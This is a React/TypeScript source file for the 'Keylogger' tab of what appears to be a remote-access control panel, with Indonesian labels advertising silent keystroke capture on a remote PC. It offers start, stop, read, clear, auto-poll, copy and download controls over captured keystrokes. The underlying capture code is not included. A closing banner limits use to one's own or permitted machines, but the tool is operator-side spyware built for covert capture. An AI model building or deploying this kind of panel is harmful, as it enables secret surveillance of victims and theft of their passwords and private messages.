"use client";
import { useState, useEffect, useRef, useCallback } from "react";
import { keyloggerAction, keyloggerStatus } from "@/lib/api";

// ── Types ──────────────────────────────────────────────────────────────────

type KLStatus = "running" | "stopped";

interface KLState {
  status:  KLStatus;
  data:    string;
  size?:   string;
  lines?:  number;
  lastKey?: string;
}

// ── Helpers ────────────────────────────────────────────────────────────────

function highlight(text: string): React.ReactNode[] {
  // Highlight special key labels like [ENTER], [BS], etc.
  const parts = text.split(/(\[[^\]]{1,20}\])/g);
  return parts.map((p, i) =>
    /^\[.+\]$/.test(p)
      ? <span key={i} style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.75rem" }}>{p}</span>
      : <span key={i}>{p}</span>
  );
}

function Stat({ label, value }: { label: string; value: string }) {
  return (
    <div style={{
      background: "rgba(0,0,0,0.25)", borderRadius: 8, padding: "10px 14px",
      display: "flex", flexDirection: "column", gap: 3,
    }}>
      <div style={{ fontSize: "0.62rem", color: "rgba(226,232,240,0.35)",
        textTransform: "uppercase", letterSpacing: "0.08em", fontWeight: 700 }}>
        {label}
      </div>
      <div style={{ fontSize: "0.88rem", fontWeight: 700, color: "#e2e8f0",
        fontFamily: "monospace" }}>
        {value}
      </div>
    </div>
  );
}

// ── Main ───────────────────────────────────────────────────────────────────

export default function KeyloggerTab() {
  const [state,    setState]    = useState<KLState>({ status: "stopped", data: "" });
  const [loading,  setLoading]  = useState<string | null>(null);
  const [toast,    setToast]    = useState<{ msg: string; ok: boolean } | null>(null);
  const [autoRead, setAutoRead] = useState(false);
  const [wrap,     setWrap]     = useState(true);
  const logRef     = useRef<HTMLDivElement>(null);
  const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const showToast = useCallback((msg: string, ok: boolean) => {
    if (toastTimer.current) clearTimeout(toastTimer.current);
    setToast({ msg, ok });
    toastTimer.current = setTimeout(() => setToast(null), 3000);
  }, []);

  // ── Fetch status + log data ─────────────────────────────────────────────

  const fetchStatus = useCallback(async (silent = true) => {
    if (!silent) setLoading("status");
    try {
      const data = await keyloggerStatus() as KLState & { status: KLStatus; data?: string };
      setState(prev => ({
        ...prev,
        status:  data.status  ?? prev.status,
        size:    data.size    ?? prev.size,
        lines:   data.lines   ?? prev.lines,
        lastKey: data.lastKey ?? prev.lastKey,
        // Only update log if we actually got data
        data: data.data !== undefined ? data.data : prev.data,
      }));
    } catch { /* silent fail */ }
    finally { if (!silent) setLoading(null); }
  }, []);

  const readLog = useCallback(async () => {
    setLoading("read");
    try {
      const data = await keyloggerAction("read") as { data?: string };
      setState(prev => ({ ...prev, data: data.data ?? "(no data)" }));
      // Scroll to bottom after update
      setTimeout(() => {
        if (logRef.current) {
          logRef.current.scrollTop = logRef.current.scrollHeight;
        }
      }, 50);
    } catch (e: unknown) {
      showToast(`❌ ${e instanceof Error ? e.message : String(e)}`, false);
    } finally {
      setLoading(null);
    }
  }, [showToast]);

  // ── Actions ─────────────────────────────────────────────────────────────

  const doAction = async (act: string, label: string) => {
    setLoading(act);
    try {
      await keyloggerAction(act);
      showToast(`✅ ${label}`, true);
      await fetchStatus(true);
      if (act === "start") {
        // Auto-read after short delay when starting
        setTimeout(readLog, 500);
      }
    } catch (e: unknown) {
      showToast(`❌ ${e instanceof Error ? e.message : String(e)}`, false);
    } finally {
      setLoading(null);
    }
  };

  // ── Auto-poll ───────────────────────────────────────────────────────────

  useEffect(() => {
    fetchStatus(true);
    const iv = setInterval(() => {
      fetchStatus(true);
      if (autoRead) readLog();
    }, 5000);
    return () => clearInterval(iv);
  }, [fetchStatus, readLog, autoRead]);

  // ── Copy to clipboard ───────────────────────────────────────────────────

  const copyLog = () => {
    if (!state.data) return;
    navigator.clipboard?.writeText(state.data)
      .then(() => showToast("✅ Log copied to clipboard", true))
      .catch(() => showToast("❌ Copy failed", false));
  };

  const isRunning = state.status === "running";

  return (
    <>
      <style>{`
        @keyframes kl-ping  { 75%,100%{transform:scale(2.2);opacity:0;} }
        @keyframes kl-up    { from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:none;} }
        @keyframes kl-blink { 0%,100%{opacity:1;}50%{opacity:0.3;} }
      `}</style>

      <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>

        {/* ── Header ──────────────────────────────────────────────── */}
        <div>
          <h2 style={{ fontSize: "1rem", fontWeight: 700, color: "#e2e8f0", margin: "0 0 3px" }}>
            ⌨️ Keylogger
          </h2>
          <p style={{ fontSize: "0.72rem", color: "rgba(226,232,240,0.35)", margin: 0 }}>
            Silent keystroke capture pada remote PC · auto-refresh 5s
          </p>
        </div>

        {/* ── Status card ──────────────────────────────────────────── */}
        <div style={{
          background: isRunning ? "rgba(16,185,129,0.06)" : "rgba(239,68,68,0.06)",
          border: `1px solid ${isRunning ? "rgba(16,185,129,0.2)" : "rgba(239,68,68,0.15)"}`,
          borderRadius: 14, padding: "16px 20px",
          display: "flex", alignItems: "center", justifyContent: "space-between",
          flexWrap: "wrap", gap: 14,
          animation: "kl-up 0.3s ease both",
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
            {/* Animated indicator */}
            <span style={{ position: "relative", display: "inline-flex", width: 14, height: 14 }}>
              <span style={{
                position: "absolute", inset: 0, borderRadius: "50%",
                background: isRunning ? "#10b981" : "#ef4444",
              }} />
              {isRunning && (
                <span style={{
                  position: "absolute", inset: 0, borderRadius: "50%",
                  background: "#10b981", opacity: 0.35,
                  animation: "kl-ping 1.5s cubic-bezier(0,0,0.2,1) infinite",
                }} />
              )}
            </span>

            <div>
              <div style={{
                fontSize: "0.95rem", fontWeight: 700,
                color: isRunning ? "#10b981" : "#ef4444",
              }}>
                Keylogger {isRunning ? "RUNNING" : "STOPPED"}
              </div>
              <div style={{ fontSize: "0.72rem", color: "rgba(226,232,240,0.4)", marginTop: 2 }}>
                {isRunning
                  ? "Merekam semua ketukan keyboard secara silent"
                  : "Tidak aktif · tekan Start untuk mulai"}
              </div>
            </div>
          </div>

          {/* Stats */}
          <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
            {state.size    && <Stat label="Log Size"  value={state.size} />}
            {state.lines   && <Stat label="Lines"     value={String(state.lines)} />}
            {state.lastKey && <Stat label="Last Key"  value={state.lastKey} />}
            {!state.size && !state.lines && (
              <Stat label="Data" value={`${state.data.length} chars`} />
            )}
          </div>
        </div>

        {/* Toast */}
        {toast && (
          <div style={{
            padding: "9px 14px", borderRadius: 8,
            background: toast.ok ? "rgba(34,197,94,0.1)" : "rgba(239,68,68,0.1)",
            border: `1px solid ${toast.ok ? "rgba(34,197,94,0.3)" : "rgba(239,68,68,0.3)"}`,
            color: toast.ok ? "#22c55e" : "#ef4444",
            fontSize: "0.8rem", fontWeight: 600,
            animation: "kl-up 0.2s ease both",
          }}>
            {toast.msg}
          </div>
        )}

        {/* ── Controls ─────────────────────────────────────────────── */}
        <div style={{
          display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center",
        }}>
          {/* Start */}
          <button
            disabled={!!loading || isRunning}
            onClick={() => doAction("start", "Keylogger started")}
            style={{
              background: isRunning ? "rgba(255,255,255,0.04)" : "rgba(34,197,94,0.12)",
              border: `1px solid ${isRunning ? "rgba(255,255,255,0.08)" : "rgba(34,197,94,0.3)"}`,
              color: isRunning ? "rgba(226,232,240,0.3)" : "#22c55e",
              borderRadius: 8, padding: "8px 18px", fontSize: "0.82rem",
              fontWeight: 600, cursor: isRunning || loading ? "not-allowed" : "pointer",
              opacity: isRunning ? 0.5 : 1, fontFamily: "inherit",
              display: "flex", alignItems: "center", gap: 6,
            }}
          >
            {loading === "start"
              ? <span style={{ width: 12, height: 12, borderRadius: "50%",
                  border: "2px solid #22c55e", borderTopColor: "transparent",
                  display: "inline-block", animation: "kl-ping 0.7s linear infinite" }} />
              : "▶"}
            Start
          </button>

          {/* Stop */}
          <button
            disabled={!!loading || !isRunning}
            onClick={() => doAction("stop", "Keylogger stopped")}
            style={{
              background: !isRunning ? "rgba(255,255,255,0.04)" : "rgba(239,68,68,0.12)",
              border: `1px solid ${!isRunning ? "rgba(255,255,255,0.08)" : "rgba(239,68,68,0.3)"}`,
              color: !isRunning ? "rgba(226,232,240,0.3)" : "#ef4444",
              borderRadius: 8, padding: "8px 18px", fontSize: "0.82rem",
              fontWeight: 600, cursor: !isRunning || loading ? "not-allowed" : "pointer",
              opacity: !isRunning ? 0.5 : 1, fontFamily: "inherit",
              display: "flex", alignItems: "center", gap: 6,
            }}
          >
            {loading === "stop"
              ? <span style={{ width: 12, height: 12, borderRadius: "50%",
                  border: "2px solid #ef4444", borderTopColor: "transparent",
                  display: "inline-block", animation: "kl-ping 0.7s linear infinite" }} />
              : "⬛"}
            Stop
          </button>

          {/* Divider */}
          <div style={{ width: 1, height: 28, background: "rgba(255,255,255,0.08)" }} />

          {/* Read */}
          <button disabled={!!loading} onClick={readLog} style={{
            background: "rgba(0,212,255,0.08)", border: "1px solid rgba(0,212,255,0.2)",
            color: "#00d4ff", borderRadius: 8, padding: "8px 16px",
            fontSize: "0.82rem", fontWeight: 600,
            cursor: loading ? "not-allowed" : "pointer", fontFamily: "inherit",
            display: "flex", alignItems: "center", gap: 6,
          }}>
            {loading === "read"
              ? <span style={{ width: 12, height: 12, borderRadius: "50%",
                  border: "2px solid #00d4ff", borderTopColor: "transparent",
                  display: "inline-block", animation: "kl-ping 0.7s linear infinite" }} />
              : "📋"}
            Read Log
          </button>

          {/* Clear */}
          <button disabled={!!loading} onClick={() => doAction("clear", "Log cleared")} style={{
            background: "rgba(251,191,36,0.08)", border: "1px solid rgba(251,191,36,0.2)",
            color: "#fbbf24", borderRadius: 8, padding: "8px 16px",
            fontSize: "0.82rem", fontWeight: 600,
            cursor: loading ? "not-allowed" : "pointer", fontFamily: "inherit",
          }}>
            {loading === "clear" ? "…" : "🗑 Clear"}
          </button>

          {/* Auto-read toggle */}
          <label style={{
            display: "flex", alignItems: "center", gap: 7,
            cursor: "pointer", marginLeft: "auto",
          }}>
            <div
              onClick={() => setAutoRead(v => !v)}
              style={{
                width: 36, height: 20, borderRadius: 10,
                background: autoRead ? "rgba(0,212,255,0.4)" : "rgba(255,255,255,0.1)",
                position: "relative", cursor: "pointer", transition: "background 0.2s",
                border: `1px solid ${autoRead ? "rgba(0,212,255,0.5)" : "rgba(255,255,255,0.15)"}`,
              }}
            >
              <div style={{
                position: "absolute", top: 2,
                left: autoRead ? 17 : 2,
                width: 14, height: 14, borderRadius: "50%",
                background: autoRead ? "#00d4ff" : "rgba(255,255,255,0.4)",
                transition: "left 0.2s",
              }} />
            </div>
            <span style={{ fontSize: "0.75rem", color: "rgba(226,232,240,0.5)" }}>
              Auto-read
            </span>
          </label>
        </div>

        {/* ── Log viewer ───────────────────────────────────────────── */}
        <div style={{
          background: "rgba(0,0,0,0.5)",
          border: "1px solid rgba(0,212,255,0.1)",
          borderRadius: 12, overflow: "hidden",
        }}>
          {/* Log header */}
          <div style={{
            padding: "10px 16px",
            background: "rgba(0,212,255,0.03)",
            borderBottom: "1px solid rgba(0,212,255,0.08)",
            display: "flex", justifyContent: "space-between", alignItems: "center",
            flexWrap: "wrap", gap: 8,
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ fontSize: "0.78rem", fontWeight: 600, color: "#e2e8f0" }}>
                📋 Captured Keystrokes
              </span>
              {isRunning && (
                <span style={{
                  fontSize: "0.62rem", fontWeight: 700, color: "#10b981",
                  animation: "kl-blink 1.5s ease infinite", letterSpacing: "0.08em",
                }}>
                  ● LIVE
                </span>
              )}
            </div>

            <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
              <span style={{ fontSize: "0.7rem", color: "rgba(226,232,240,0.3)",
                fontFamily: "monospace" }}>
                {state.data.length} chars
              </span>

              {/* Word wrap toggle */}
              <button onClick={() => setWrap(v => !v)} style={{
                background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.09)",
                color: "rgba(226,232,240,0.5)", borderRadius: 6, padding: "3px 10px",
                fontSize: "0.7rem", cursor: "pointer", fontFamily: "inherit",
              }}>
                {wrap ? "↔ Nowrap" : "↩ Wrap"}
              </button>

              {/* Copy */}
              <button onClick={copyLog} disabled={!state.data} style={{
                background: "rgba(0,212,255,0.07)", border: "1px solid rgba(0,212,255,0.18)",
                color: "#00d4ff", borderRadius: 6, padding: "3px 10px",
                fontSize: "0.7rem", fontWeight: 600, cursor: state.data ? "pointer" : "not-allowed",
                fontFamily: "inherit", opacity: state.data ? 1 : 0.4,
              }}>
                📋 Copy
              </button>

              {/* Download */}
              {state.data && (
                <a
                  href={`data:text/plain;charset=utf-8,${encodeURIComponent(state.data)}`}
                  download={`keylog_${Date.now()}.txt`}
                  style={{
                    background: "rgba(34,197,94,0.07)", border: "1px solid rgba(34,197,94,0.18)",
                    color: "#22c55e", borderRadius: 6, padding: "3px 10px",
                    fontSize: "0.7rem", fontWeight: 600, textDecoration: "none",
                  }}
                >
                  ⬇ Save
                </a>
              )}
            </div>
          </div>

          {/* Log body */}
          <div
            ref={logRef}
            style={{
              background: "#000",
              padding: 16,
              fontFamily: "monospace",
              fontSize: "0.8rem",
              color: "#00d4ff",
              whiteSpace: wrap ? "pre-wrap" : "pre",
              overflowX: wrap ? "hidden" : "auto",
              overflowY: "auto",
              maxHeight: 420,
              minHeight: 120,
              lineHeight: 1.7,
            }}
          >
            {state.data
              ? highlight(state.data)
              : (
                <span style={{ color: "rgba(226,232,240,0.25)", fontSize: "0.8rem" }}>
                  (tidak ada data — start keylogger lalu klik "Read Log")
                </span>
              )
            }
          </div>
        </div>

        {/* ── Warning ──────────────────────────────────────────────── */}
        <div style={{
          background: "rgba(245,158,11,0.06)",
          border: "1px solid rgba(245,158,11,0.18)",
          borderRadius: 10, padding: "10px 14px",
          fontSize: "0.76rem", color: "#f59e0b",
          lineHeight: 1.6,
        }}>
          ⚠️ <strong>Perhatian:</strong> Gunakan keylogger hanya pada PC milik sendiri atau yang
          telah mendapatkan izin eksplisit. Penggunaan tanpa izin merupakan pelanggaran privasi.
        </div>
      </div>
    </>
  );
}